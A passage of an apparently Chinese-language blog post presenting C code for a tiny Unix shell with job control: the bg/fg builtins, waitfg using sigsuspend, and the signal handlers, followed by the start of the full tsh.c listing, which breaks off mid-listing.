class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> parsed;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-keyword">if</span> (!argv[<span class="hljs-number">1</span>])<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s commond requires PID or %%JID argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) <span class="hljs-comment">//错误检查以及取出PID或者JID</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobjid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such job\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobpid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//fg和bg分别处理</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>))<br>    &#123;<br>        job-&gt;state = BG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//发送signal到groupid为|job-&gt;pid|的组</span><br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>    &#123;<br>        job-&gt;state = FG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        waitfg(job-&gt;pid);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do_bgfg: Internal error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-waitfg-等待前台程序结束"><a href="#4-waitfg-等待前台程序结束" class="headerlink" title="4.waitfg()等待前台程序结束"></a>4.<code>waitfg()</code>等待前台程序结束</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//使用sigsuspend</span><br>    <span class="hljs-keyword">sigset_t</span> sig, prev;<br>    sigemptyset(&amp;sig);<br>    sigaddset(&amp;sig, SIGCHLD);<br>    sigprocmask(SIG_BLOCK, &amp;sig, &amp;prev);<br>    <br>    <span class="hljs-keyword">while</span>(pid == fgpid(jobs))<br>        sigsuspend(&amp;prev);<br>    <br>    sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>(verbose)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-signal-handlers"><a href="#5-signal-handlers" class="headerlink" title="5.signal_handlers"></a>5.<code>signal_handlers</code></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*****************</span><br><span class="hljs-comment"> * Signal handlers</span><br><span class="hljs-comment"> *****************/</span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))<br>        &#123; <span class="hljs-comment">/*process is exited in normal way*/</span><br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSIGNALED(status))<br>        &#123; <span class="hljs-comment">/*process is terminated by a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSTOPPED(status))<br>        &#123; <span class="hljs-comment">/*process is stop because of a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>            <span class="hljs-keyword">if</span> (job != <span class="hljs-literal">NULL</span>)<br>                job-&gt;state = ST;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        kill(-pid, SIGINT);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>        <span class="hljs-keyword">if</span> (job-&gt;state == ST)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            kill(-pid, SIGTSTP);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="其余代码"><a href="#其余代码" class="headerlink" title="其余代码"></a>其余代码</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tsh - A tiny shell program with job control</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * &lt;Put your name and login ID here&gt;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><br><span class="hljs-comment">/* Misc manifest constants */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXLINE 1024   <span class="hljs-comment">/* max line size */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXARGS 128    <span class="hljs-comment">/* max args on a command line */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJOBS 16     <span class="hljs-comment">/* max jobs at any point in time */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="hljs-comment">/* max job ID */</span></span><br><br><span class="hljs-comment">/* Job states */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> UNDEF 0 <span class="hljs-comment">/* undefined */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FG 1    <span class="hljs-comment">/* running in foreground */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BG 2    <span class="hljs-comment">/* running in background */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ST 3    <span class="hljs-comment">/* stopped */</span></span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span><br><span class="hljs-comment"> * Job state transitions and enabling actions:</span><br><span class="hljs-comment"> *     FG -&gt; ST  : ctrl-z</span><br><span class="hljs-comment"> *     ST -&gt; FG  : fg command</span><br><span class="hljs-comment"> *     ST -&gt; BG  : bg command</span><br><span class="hljs-comment"> *     BG -&gt; FG  : fg command</span><br><span class="hljs-comment"> * At most 1 job can be in the FG state.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* Global variables */</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;   <span class="hljs-comment">/* defined in libc */</span><br><span class="hljs-keyword">char</span> prompt[] = <span class="hljs-string">&quot;tsh&gt; &quot;</span>; <span class="hljs-comment">/* command line prompt (DO NOT CHANGE) */</span><br><span class="hljs-keyword">int</span> verbose = <span class="hljs-number">0</span>;         <span class="hljs-comment">/* if true, print additional output */</span><br><span class="hljs-keyword">int</span> nextjid = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* next job ID to allocate */</span><br><span class="hljs-keyword">char</span> sbuf[MAXLINE];      <span class="hljs-comment">/* for composing sprintf messages */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span></span><br><span class="hljs-class">&#123;</span>                          <span class="hljs-comment">/* The job struct */</span><br>    <span class="hljs-keyword">pid_t</span> pid;             <span class="hljs-comment">/* job PID */</span><br>    <span class="hljs-keyword">int</span> jid;               <span class="hljs-comment">/* job ID [1, 2, ...] */</span><br>    <span class="hljs-keyword">int</span> state;             <span class="hljs-comment">/* UNDEF, BG, FG, or ST */</span><br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE]; <span class="hljs-comment">/* command line */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> <span class="hljs-title">jobs</span>[<span class="hljs-title">MAXJOBS</span>];</span> <span class="hljs-comment">/* The job list */</span><br><span class="hljs-comment">/* End global variables */</span><br><br><span class="hljs-comment">/* Function prototypes */</span><br><br><span class="hljs-comment">/* Here are the functions that you will implement */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-comment">/* Here are helper routines that we&#x27;ve provided for you */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span 